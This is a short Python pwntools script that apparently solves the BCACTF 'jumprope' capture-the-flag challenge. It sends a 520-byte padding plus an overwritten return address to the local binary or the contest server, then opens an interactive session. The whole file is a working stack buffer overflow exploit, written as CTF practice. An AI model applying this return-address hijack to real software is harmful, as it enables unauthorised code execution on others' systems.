import pwn
import argparse

parser = argparse.ArgumentParser()

parser.add_argument("-r", "--remote", help="perform the attack on the remote target",
                    action="store_true")
args = parser.parse_args()
if args.remote :
    p = pwn.remote('bin.bcactf.com', 49177)
else:
    p = pwn.process("./jumprope")


## cause of the endbr64 this didnt work when did try this localy but i did work on the remote server
#new_rip = pwn.p64(0x00000000004011b6)
 
new_rip = pwn.p64(0x00000000004011bb)
 
offset = 520  

payload = b"".join(
    [
        b"A" * offset,
        new_rip
    ]
)
  
print(p.recvuntil('jumping!'.encode()).decode('utf-8'))

p.sendline(payload)

print(p.recv().decode('utf-8'))

p.interactive()


 
